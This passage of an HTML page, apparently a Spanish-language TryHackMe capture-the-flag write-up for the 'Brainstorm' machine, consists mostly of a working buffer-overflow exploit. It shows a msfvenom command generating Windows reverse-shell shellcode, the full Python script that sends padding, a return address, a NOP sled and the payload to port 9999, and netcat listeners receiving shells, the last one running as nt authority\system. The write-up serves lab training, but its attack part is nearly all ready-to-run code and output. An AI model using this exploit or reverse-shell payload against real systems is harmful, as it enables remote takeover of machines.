+<span class="sa">b</span><span class="s2">&quot;</span><span class="se">\xfb\x41\xe1\xff\x53\x3a\x42\xaf\x13\xea\x2a\xa5\x9b\xd5</span><span class="s2">&quot;</span>
+<span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x4b\xc6\x71\x7e\xe1\x3d\x12\x41\x5e\xa2\x62\x29\x9d\xdc</span><span class="s2">&quot;</span>
+<span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x73\xf6\x28\x3a\x19\x16\x7d\x95\xb6\x8f\x24\x6d\x26\x4f</span><span class="s2">&quot;</span>
+<span class="sa">b</span><span class="s2">&quot;</span><span class="se">\xf3\x08\x68\xdb\xf0\xed\x27\x2c\x7c\xfd\xd0\xdc\xcb\x5f</span><span class="s2">&quot;</span>
+<span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x76\xe2\xe1\xf7\x14\x71\x6e\x07\x52\x6a\x39\x50\x33\x5c</span><span class="s2">&quot;</span>
+<span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x30\x34\xa9\xc7\xea\x2a\x30\x91\xd5\xee\xef\x62\xdb\xef</span><span class="s2">&quot;</span>
+<span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x62\xde\xff\xff\xba\xdf\xbb\xab\x12\xb6\x15\x05\xd5\x60</span><span class="s2">&quot;</span>
+<span class="sa">b</span><span class="s2">&quot;</span><span class="se">\xd4\xff\x8f\xdf\xbe\x97\x56\x2c\x01\xe1\x56\x79\xf7\x0d</span><span class="s2">&quot;</span>
+<span class="sa">b</span><span class="s2">&quot;</span><span class="se">\xe6\xd4\x4e\x32\xc7\xb0\x46\x4b\x35\x21\xa8\x86\xfd\x41</span><span class="s2">&quot;</span>
+<span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x4b\x02\x08\xea\xd2\xc7\xb1\x77\xe5\x32\xf5\x81\x66\xb6</span><span class="s2">&quot;</span>
+<span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x86\x75\x76\xb3\x83\x32\x30\x28\xfe\x2b\xd5\x4e\xad\x4c</span><span class="s2">&quot;</span>
+<span class="sa">b</span><span class="s2">&quot;</span><span class="se">\xfc</span><span class="s2">&quot;</span><span class="p">)</span>
+
+<span class="k">try</span><span class="p">:</span>
+    <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;Enviado Paylaod...&quot;</span><span class="p">)</span>
+    <span class="n">s</span><span class="o">=</span><span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
+    <span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="s1">&#39;192.168.159.134&#39;</span><span class="p">,</span><span class="mi">9999</span><span class="p">))</span>
+    <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
+    <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
+    <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">username</span> <span class="o">+</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\r\n</span><span class="s1">&#39;</span><span class="p">)</span>
+    <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
+    <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">message</span> <span class="o">+</span> <span class="n">payload</span> <span class="o">+</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\r\n</span><span class="s1">&#39;</span><span class="p">)</span>
+    <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
+    <span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+
+<span class="k">except</span><span class="p">:</span>
+    <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;no se puede conectar al servidor&quot;</span><span class="p">)</span>
+    <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">()</span>                    
+</code></pre></div>
+<p>Nos ponemos en escucha con nc y ejecutamos el Script, hemos logrado el acceso a la maquina</p>
+<div class="highlight"><pre><span></span><code>python3<span class="w"> </span>overflow.py<span class="w"> </span>
+Enviado<span class="w"> </span>Paylaod...
+</code></pre></div>
+<div class="highlight"><pre><span></span><code>nc<span class="w"> </span>-nvlp<span class="w"> </span><span class="m">4444</span><span class="w"> </span>
+listening<span class="w"> </span>on<span class="w"> </span><span class="o">[</span>any<span class="o">]</span><span class="w"> </span><span class="m">4444</span><span class="w"> </span>...
+connect<span class="w"> </span>to<span class="w"> </span><span class="o">[</span><span class="m">192</span>.168.159.128<span class="o">]</span><span class="w"> </span>from<span class="w"> </span><span class="o">(</span>UNKNOWN<span class="o">)</span><span class="w"> </span><span class="o">[</span><span class="m">192</span>.168.159.134<span class="o">]</span><span class="w"> </span><span class="m">49334</span>
+Microsoft<span class="w"> </span>Windows<span class="w"> </span><span class="o">[</span>Versi�n<span class="w"> </span><span class="m">6</span>.1.7601<span class="o">]</span>
+Copyright<span class="w"> </span><span class="o">(</span>c<span class="o">)</span><span class="w"> </span><span class="m">2009</span><span class="w"> </span>Microsoft<span class="w"> </span>Corporation.<span class="w"> </span>Reservados<span class="w"> </span>todos<span class="w"> </span>los<span class="w"> </span>derechos.
+
+C:<span class="se">\U</span>sers<span class="se">\r</span>odrigo<span class="se">\D</span>esktop<span class="se">\b</span>rainstorm&gt;whoami
+whoami
+win-vd633hun67h<span class="se">\r</span>odrigo
+
+C:<span class="se">\U</span>sers<span class="se">\r</span>odrigo<span class="se">\D</span>esktop<span class="se">\b</span>rainstorm&gt;ipconfig
+ipconfig
+
+Configuraci�n<span class="w"> </span>IP<span class="w"> </span>de<span class="w"> </span>Windows
+
+
+Adaptador<span class="w"> </span>de<span class="w"> </span>Ethernet<span class="w"> </span>Conexi�n<span class="w"> </span>de<span class="w"> </span>�rea<span class="w"> </span>local:
+
+<span class="w">   </span>Sufijo<span class="w"> </span>DNS<span class="w"> </span>espec�fico<span class="w"> </span>para<span class="w"> </span>la<span class="w"> </span>conexi�n.<span class="w"> </span>.<span class="w"> </span>:<span class="w"> </span>localdomain
+<span class="w">   </span>V�nculo:<span class="w"> </span>direcci�n<span class="w"> </span>IPv6<span class="w"> </span>local.<span class="w"> </span>.<span class="w"> </span>.<span class="w"> </span>:<span class="w"> </span>fe80::d4eb:1935:6bfd:2c60%11
+<span class="w">   </span>Direcci�n<span class="w"> </span>IPv4.<span class="w"> </span>.<span class="w"> </span>.<span class="w"> </span>.<span class="w"> </span>.<span class="w"> </span>.<span class="w"> </span>.<span class="w"> </span>.<span class="w"> </span>.<span class="w"> </span>.<span class="w"> </span>.<span class="w"> </span>.<span class="w"> </span>.<span class="w"> </span>.<span class="w"> </span>:<span class="w"> </span><span class="m">192</span>.168.159.134
+<span class="w">   </span>M�scara<span class="w"> </span>de<span class="w"> </span>subred<span class="w"> </span>.<span class="w"> </span>.<span class="w"> </span>.<span class="w"> </span>.<span class="w"> </span>.<span class="w"> </span>.<span class="w"> </span>.<span class="w"> </span>.<span class="w"> </span>.<span class="w"> </span>.<span class="w"> </span>.<span class="w"> </span>.<span class="w"> </span>:<span class="w"> </span><span class="m">255</span>.255.255.0
+<span class="w">   </span>Puerta<span class="w"> </span>de<span class="w"> </span>enlace<span class="w"> </span>predeterminada<span class="w"> </span>.<span class="w"> </span>.<span class="w"> </span>.<span class="w"> </span>.<span class="w"> </span>.<span class="w"> </span>:<span class="w"> </span><span class="m">192</span>.168.159.2
+
+Adaptador<span class="w"> </span>de<span class="w"> </span>t�nel<span class="w"> </span>isatap.localdomain:
+
+<span class="w">   </span>Estado<span class="w"> </span>de<span class="w"> </span>los<span class="w"> </span>medios.<span class="w"> </span>.<span class="w"> </span>.<span class="w"> </span>.<span class="w"> </span>.<span class="w"> </span>.<span class="w"> </span>.<span class="w"> </span>.<span class="w"> </span>.<span class="w"> </span>.<span class="w"> </span>.<span class="w"> </span>:<span class="w"> </span>medios<span class="w"> </span>desconectados
+<span class="w">   </span>Sufijo<span class="w"> </span>DNS<span class="w"> </span>espec�fico<span class="w"> </span>para<span class="w"> </span>la<span class="w"> </span>conexi�n.<span class="w"> </span>.<span class="w"> </span>:<span class="w"> </span>localdomain
+
+C:<span class="se">\U</span>sers<span class="se">\r</span>odrigo<span class="se">\D</span>esktop<span class="se">\b</span>rainstorm&gt;
+</code></pre></div>
+<h2 id="exploit">Exploit<a class="headerlink" href="#exploit" title="Permanent link">&para;</a></h2>
+<p>Ahora probamos el Script en nuestra máquina de THM</p>
+<div class="highlight"><pre><span></span><code>msfvenom<span class="w"> </span>-p<span class="w"> </span>windows/shell_reverse_tcp<span class="w"> </span><span class="nv">LHOST</span><span class="o">=</span><span class="m">10</span>.9.244.36<span class="w"> </span><span class="nv">LPORT</span><span class="o">=</span><span class="m">4444</span><span class="w"> </span><span class="nv">EXITFUNC</span><span class="o">=</span>thread<span class="w"> </span>-b<span class="w"> </span><span class="s2">&quot;\x00&quot;</span><span class="w"> </span>-f<span class="w"> </span>c
+<span class="o">[</span>-<span class="o">]</span><span class="w"> </span>No<span class="w"> </span>platform<span class="w"> </span>was<span class="w"> </span>selected,<span class="w"> </span>choosing<span class="w"> </span>Msf::Module::Platform::Windows<span class="w"> </span>from<span class="w"> </span>the<span class="w"> </span>payload
+<span class="o">[</span>-<span class="o">]</span><span class="w"> </span>No<span class="w"> </span>arch<span class="w"> </span>selected,<span class="w"> </span>selecting<span class="w"> </span>arch:<span class="w"> </span>x86<span class="w"> </span>from<span class="w"> </span>the<span class="w"> </span>payload
+Found<span class="w"> </span><span class="m">11</span><span class="w"> </span>compatible<span class="w"> </span>encoders
+Attempting<span class="w"> </span>to<span class="w"> </span>encode<span class="w"> </span>payload<span class="w"> </span>with<span class="w"> </span><span class="m">1</span><span class="w"> </span>iterations<span class="w"> </span>of<span class="w"> </span>x86/shikata_ga_nai
+x86/shikata_ga_nai<span class="w"> </span>succeeded<span class="w"> </span>with<span class="w"> </span>size<span class="w"> </span><span class="m">351</span><span class="w"> </span><span class="o">(</span><span class="nv">iteration</span><span class="o">=</span><span class="m">0</span><span class="o">)</span>
+x86/shikata_ga_nai<span class="w"> </span>chosen<span class="w"> </span>with<span class="w"> </span>final<span class="w"> </span>size<span class="w"> </span><span class="m">351</span>
+Payload<span class="w"> </span>size:<span class="w"> </span><span class="m">351</span><span class="w"> </span>bytes
+Final<span class="w"> </span>size<span class="w"> </span>of<span class="w"> </span>c<span class="w"> </span>file:<span class="w"> </span><span class="m">1506</span><span class="w"> </span>bytes
+unsigned<span class="w"> </span>char<span class="w"> </span>buf<span class="o">[]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>
+<span class="s2">&quot;\xda\xdf\xd9\x74\x24\xf4\xba\xe9\x7b\x83\xf3\x58\x31\xc9&quot;</span>
+<span class="s2">&quot;\xb1\x52\x31\x50\x17\x83\xc0\x04\x03\xb9\x68\x61\x06\xc5&quot;</span>
+<span class="s2">&quot;\x67\xe7\xe9\x35\x78\x88\x60\xd0\x49\x88\x17\x91\xfa\x38&quot;</span>
+<span class="s2">&quot;\x53\xf7\xf6\xb3\x31\xe3\x8d\xb6\x9d\x04\x25\x7c\xf8\x2b&quot;</span>
+<span class="s2">&quot;\xb6\x2d\x38\x2a\x34\x2c\x6d\x8c\x05\xff\x60\xcd\x42\xe2&quot;</span>
+<span class="s2">&quot;\x89\x9f\x1b\x68\x3f\x0f\x2f\x24\xfc\xa4\x63\xa8\x84\x59&quot;</span>
+<span class="s2">&quot;\x33\xcb\xa5\xcc\x4f\x92\x65\xef\x9c\xae\x2f\xf7\xc1\x8b&quot;</span>
+<span class="s2">&quot;\xe6\x8c\x32\x67\xf9\x44\x0b\x88\x56\xa9\xa3\x7b\xa6\xee&quot;</span>
+<span class="s2">&quot;\x04\x64\xdd\x06\x77\x19\xe6\xdd\x05\xc5\x63\xc5\xae\x8e&quot;</span>
+<span class="s2">&quot;\xd4\x21\x4e\x42\x82\xa2\x5c\x2f\xc0\xec\x40\xae\x05\x87&quot;</span>
+<span class="s2">&quot;\x7d\x3b\xa8\x47\xf4\x7f\x8f\x43\x5c\xdb\xae\xd2\x38\x8a&quot;</span>
+<span class="s2">&quot;\xcf\x04\xe3\x73\x6a\x4f\x0e\x67\x07\x12\x47\x44\x2a\xac&quot;</span>
+<span class="s2">&quot;\x97\xc2\x3d\xdf\xa5\x4d\x96\x77\x86\x06\x30\x80\xe9\x3c&quot;</span>
+<span class="s2">&quot;\x84\x1e\x14\xbf\xf5\x37\xd3\xeb\xa5\x2f\xf2\x93\x2d\xaf&quot;</span>
+<span class="s2">&quot;\xfb\x41\xe1\xff\x53\x3a\x42\xaf\x13\xea\x2a\xa5\x9b\xd5&quot;</span>
+<span class="s2">&quot;\x4b\xc6\x71\x7e\xe1\x3d\x12\x41\x5e\xa2\x62\x29\x9d\xdc&quot;</span>
+<span class="s2">&quot;\x73\xf6\x28\x3a\x19\x16\x7d\x95\xb6\x8f\x24\x6d\x26\x4f&quot;</span>
+<span class="s2">&quot;\xf3\x08\x68\xdb\xf0\xed\x27\x2c\x7c\xfd\xd0\xdc\xcb\x5f&quot;</span>
+<span class="s2">&quot;\x76\xe2\xe1\xf7\x14\x71\x6e\x07\x52\x6a\x39\x50\x33\x5c&quot;</span>
+<span class="s2">&quot;\x30\x34\xa9\xc7\xea\x2a\x30\x91\xd5\xee\xef\x62\xdb\xef&quot;</span>
+<span class="s2">&quot;\x62\xde\xff\xff\xba\xdf\xbb\xab\x12\xb6\x15\x05\xd5\x60&quot;</span>
+<span class="s2">&quot;\xd4\xff\x8f\xdf\xbe\x97\x56\x2c\x01\xe1\x56\x79\xf7\x0d&quot;</span>
+<span class="s2">&quot;\xe6\xd4\x4e\x32\xc7\xb0\x46\x4b\x35\x21\xa8\x86\xfd\x41&quot;</span>
+<span class="s2">&quot;\x4b\x02\x08\xea\xd2\xc7\xb1\x77\xe5\x32\xf5\x81\x66\xb6&quot;</span>
+<span class="s2">&quot;\x86\x75\x76\xb3\x83\x32\x30\x28\xfe\x2b\xd5\x4e\xad\x4c&quot;</span>
+<span class="s2">&quot;\xfc&quot;</span><span class="p">;</span>
+</code></pre></div>
+<div class="highlight"><pre><span></span><code><span class="kn">import</span><span class="w"> </span><span class="nn">socket</span>
+<span class="kn">import</span><span class="w"> </span><span class="nn">sys</span>
+
+<span class="n">username</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&quot;rdrgox&quot;</span>
+<span class="n">message</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&quot;A&quot;</span> <span class="o">*</span> <span class="mi">2012</span> <span class="o">+</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\xdf\x14\x50\x62</span><span class="s2">&quot;</span> <span class="o">+</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x90</span><span class="s2">&quot;</span> <span class="o">*</span> <span class="mi">32</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="p">(</span><span class="sa">b</span><span class="s2">&quot;</span><span class="se">\xda\xdf\xd9\x74\x24\xf4\xba\xe9\x7b\x83\xf3\x58\x31\xc9</span><span class="s2">&quot;</span>
+<span class="sa">b</span><span class="s2">&quot;</span><span class="se">\xb1\x52\x31\x50\x17\x83\xc0\x04\x03\xb9\x68\x61\x06\xc5</span><span class="s2">&quot;</span>
+<span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x67\xe7\xe9\x35\x78\x88\x60\xd0\x49\x88\x17\x91\xfa\x38</span><span class="s2">&quot;</span>
+<span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x53\xf7\xf6\xb3\x31\xe3\x8d\xb6\x9d\x04\x25\x7c\xf8\x2b</span><span class="s2">&quot;</span>
+<span class="sa">b</span><span class="s2">&quot;</span><span class="se">\xb6\x2d\x38\x2a\x34\x2c\x6d\x8c\x05\xff\x60\xcd\x42\xe2</span><span class="s2">&quot;</span>
+<span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x89\x9f\x1b\x68\x3f\x0f\x2f\x24\xfc\xa4\x63\xa8\x84\x59</span><span class="s2">&quot;</span>
+<span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x33\xcb\xa5\xcc\x4f\x92\x65\xef\x9c\xae\x2f\xf7\xc1\x8b</span><span class="s2">&quot;</span>
+<span class="sa">b</span><span class="s2">&quot;</span><span class="se">\xe6\x8c\x32\x67\xf9\x44\x0b\x88\x56\xa9\xa3\x7b\xa6\xee</span><span class="s2">&quot;</span>
+<span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x04\x64\xdd\x06\x77\x19\xe6\xdd\x05\xc5\x63\xc5\xae\x8e</span><span class="s2">&quot;</span>
+<span class="sa">b</span><span class="s2">&quot;</span><span class="se">\xd4\x21\x4e\x42\x82\xa2\x5c\x2f\xc0\xec\x40\xae\x05\x87</span><span class="s2">&quot;</span>
+<span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x7d\x3b\xa8\x47\xf4\x7f\x8f\x43\x5c\xdb\xae\xd2\x38\x8a</span><span class="s2">&quot;</span>
+<span class="sa">b</span><span class="s2">&quot;</span><span class="se">\xcf\x04\xe3\x73\x6a\x4f\x0e\x67\x07\x12\x47\x44\x2a\xac</span><span class="s2">&quot;</span>
+<span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x97\xc2\x3d\xdf\xa5\x4d\x96\x77\x86\x06\x30\x80\xe9\x3c</span><span class="s2">&quot;</span>
+<span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x84\x1e\x14\xbf\xf5\x37\xd3\xeb\xa5\x2f\xf2\x93\x2d\xaf</span><span class="s2">&quot;</span>
+<span class="sa">b</span><span class="s2">&quot;</span><span class="se">\xfb\x41\xe1\xff\x53\x3a\x42\xaf\x13\xea\x2a\xa5\x9b\xd5</span><span class="s2">&quot;</span>
+<span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x4b\xc6\x71\x7e\xe1\x3d\x12\x41\x5e\xa2\x62\x29\x9d\xdc</span><span class="s2">&quot;</span>
+<span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x73\xf6\x28\x3a\x19\x16\x7d\x95\xb6\x8f\x24\x6d\x26\x4f</span><span class="s2">&quot;</span>
+<span class="sa">b</span><span class="s2">&quot;</span><span class="se">\xf3\x08\x68\xdb\xf0\xed\x27\x2c\x7c\xfd\xd0\xdc\xcb\x5f</span><span class="s2">&quot;</span>
+<span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x76\xe2\xe1\xf7\x14\x71\x6e\x07\x52\x6a\x39\x50\x33\x5c</span><span class="s2">&quot;</span>
+<span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x30\x34\xa9\xc7\xea\x2a\x30\x91\xd5\xee\xef\x62\xdb\xef</span><span class="s2">&quot;</span>
+<span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x62\xde\xff\xff\xba\xdf\xbb\xab\x12\xb6\x15\x05\xd5\x60</span><span class="s2">&quot;</span>
+<span class="sa">b</span><span class="s2">&quot;</span><span class="se">\xd4\xff\x8f\xdf\xbe\x97\x56\x2c\x01\xe1\x56\x79\xf7\x0d</span><span class="s2">&quot;</span>
+<span class="sa">b</span><span class="s2">&quot;</span><span class="se">\xe6\xd4\x4e\x32\xc7\xb0\x46\x4b\x35\x21\xa8\x86\xfd\x41</span><span class="s2">&quot;</span>
+<span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x4b\x02\x08\xea\xd2\xc7\xb1\x77\xe5\x32\xf5\x81\x66\xb6</span><span class="s2">&quot;</span>
+<span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x86\x75\x76\xb3\x83\x32\x30\x28\xfe\x2b\xd5\x4e\xad\x4c</span><span class="s2">&quot;</span>
+<span class="sa">b</span><span class="s2">&quot;</span><span class="se">\xfc</span><span class="s2">&quot;</span><span class="p">)</span>
+
+<span class="k">try</span><span class="p">:</span>
+    <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;Enviado Paylaod...&quot;</span><span class="p">)</span>
+    <span class="n">s</span><span class="o">=</span><span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
+    <span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="s1">&#39;10.201.14.163&#39;</span><span class="p">,</span><span class="mi">9999</span><span class="p">))</span>
+    <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
+    <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
+    <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">username</span> <span class="o">+</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\r\n</span><span class="s1">&#39;</span><span class="p">)</span>
+    <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
+    <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">message</span> <span class="o">+</span> <span class="n">payload</span> <span class="o">+</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\r\n</span><span class="s1">&#39;</span><span class="p">)</span>
+    <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
+    <span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+
+<span class="k">except</span><span class="p">:</span>
+    <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;no se puede conectar al servidor&quot;</span><span class="p">)</span>
+    <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">()</span>                    
+</code></pre></div>
+<p>nos ponemos en escucha con nc</p>
+<div class="highlight"><pre><span></span><code>nc<span class="w"> </span>-nvlp<span class="w"> </span><span class="m">4444</span>
+listening<span class="w"> </span>on<span class="w"> </span><span class="o">[</span>any<span class="o">]</span><span class="w"> </span><span class="m">4444</span><span class="w"> </span>...
+connect<span class="w"> </span>to<span class="w"> </span><span class="o">[</span><span class="m">10</span>.9.244.36<span class="o">]</span><span class="w"> </span>from<span class="w"> </span><span class="o">(</span>UNKNOWN<span class="o">)</span><span class="w"> </span><span class="o">[</span><span class="m">10</span>.201.14.163<span class="o">]</span><span class="w"> </span><span class="m">54229</span>
+Microsoft<span class="w"> </span>Windows<span class="w"> </span><span class="o">[</span>Version<span class="w"> </span><span class="m">6</span>.1.7601<span class="o">]</span>
+Copyright<span class="w"> </span><span class="o">(</span>c<span class="o">)</span><span class="w"> </span><span class="m">2009</span><span class="w"> </span>Microsoft<span class="w"> </span>Corporation.<span class="w"> </span>All<span class="w"> </span>rights<span class="w"> </span>reserved.
+
+C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt;whoami
+whoami
+nt<span class="w"> </span>authority<span class="se">\s</span>ystem
+</code></pre></div>
+
+
+
+
+
+
+
+  
+  
+
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    
+      
+      
+      <script id="__config" type="application/json">{"annotate": null, "base": "../..", "features": ["navigation.instant", "navigation.tracking", "navigation.sections", "navigation.expand", "navigation.path", "content.code.copy", "search.highlight"], "search": "../../assets/javascripts/workers/search.2c215733.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script>
+    
+    
+      <script src="../../assets/javascripts/bundle.79ae519e.min.js"></script>
+      
+    
+  </body>
+</html>
